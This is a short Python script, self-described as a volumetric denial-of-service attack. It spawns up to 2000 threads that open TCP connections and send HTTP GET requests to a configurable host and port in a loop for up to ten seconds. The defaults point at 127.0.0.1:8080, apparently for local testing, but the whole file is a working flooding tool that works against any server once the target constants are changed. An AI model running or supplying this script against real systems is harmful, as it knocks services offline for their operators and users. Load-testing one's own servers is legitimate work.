#!/usr/bin/env python3
# Performs a standard volumetric DoS attack on a server
# Attempts to just send more requests than the server has
# space for by opening a bunch of threads that send requests
# in an infinite loop until termination
import socket
import threading
from time import time, sleep


TARGET_HOST, TARGET_PORT = '127.0.0.1', 8080
NUM_THREADS = 2000
MAX_DURATION = 10


terminate_signal = threading.Event()


def open_connection() -> None:
    while not terminate_signal.is_set():
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.connect((TARGET_HOST, TARGET_PORT))
                print('Connection established')
                sock.sendall(
                    b'GET / HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n')
                print(f'Response received')
        except Exception as error:
            print(f'Error: {error}')
            break


def get_duration(start_time: float) -> float:
    curr_time = time()
    return curr_time - start_time


def run_dos() -> None:
    threads = []
    start_time = time()

    for _ in range(NUM_THREADS):
        thread = threading.Thread(target=open_connection)
        thread.start()
        threads.append(thread)

        if get_duration(start_time) > MAX_DURATION:
            print('DoS max duration exceeded')
            break

    while get_duration(start_time) <= MAX_DURATION:
        sleep(0.1)

    terminate_signal.set()
    for thread in threads:
        thread.join()
    print('DoS terminated')


if __name__ == '__main__':
    try:
        run_dos()
    except KeyboardInterrupt:
        terminate_signal.set()
        for thread in threading.enumerate():
            if thread is not threading.current_thread():
                thread.join()
        print('DoS terminated')
